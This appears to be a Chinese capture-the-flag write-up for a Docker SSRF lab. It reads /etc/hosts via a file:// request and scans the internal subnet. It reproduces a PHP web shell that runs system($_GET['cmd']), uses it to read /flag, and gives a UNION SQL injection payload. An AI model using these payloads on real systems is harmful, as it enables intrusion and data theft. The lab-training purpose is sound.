# ProbiusOfficial/ssrf-labs wp

docker compose up -d 搭好靶机后，用 kali 浏览器访问 8880 端口：  

有个入口可以发起请求，`file:///etc/hosts` 拿到主机 IP。  
```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::	ip6-localnet
ff00::	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.72.23.21	560dfa9475ce
```

确定内网 IP 是 `172.72.23.21` 可以知道网段为 `172.72.23.1/24`。    

用 burpsuite 的 intruder 爆破网段扫内网资源，这里太慢了，就直接用别人的了。  
```
172.72.23.21 - 80
172.72.23.22 - 80(3306) 
172.72.23.23 - 80
172.72.23.24 - 80
172.72.23.25 - 80
172.72.23.26 - 8080
172.72.23.27 - 6379
```

172.72.23.22 有个 shell.php，代码如下：  
``` php
 <?php

highlight_file(__FILE__);

$cmd = $_GET['cmd'];
if (isset($cmd)) {
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}

?>
```

有 cmd get 请求，跑 shell 直接拿 flag:  
```
http://172.72.23.22/shell.php?cmd=cat /flag
```
172.72.23.23 是一个 sql 注入漏洞：  
```
http://172.72.23.23?id=-1 union select 1,2, data from flag
```

172.72.23.24 是一个 network status checker API，用 POST 传参。  
``` html
<form method="POST" action="ping.php" class="mb-4">
     <div class="row g-3 align-items-center">
         <div class="col-auto">
             <input type="text" class="form-control" 
                    name="target" placeholder="输入IP地址或域名"
                    pattern="^[a-zA-Z0-9.-]+$" 
                    title="请输入有效的IP地址或域名">
         </div>
         <div class="col-auto">
             <button type="submit" class="btn btn-primary">检测</button>
         </div>
     </div>
 </form>
```


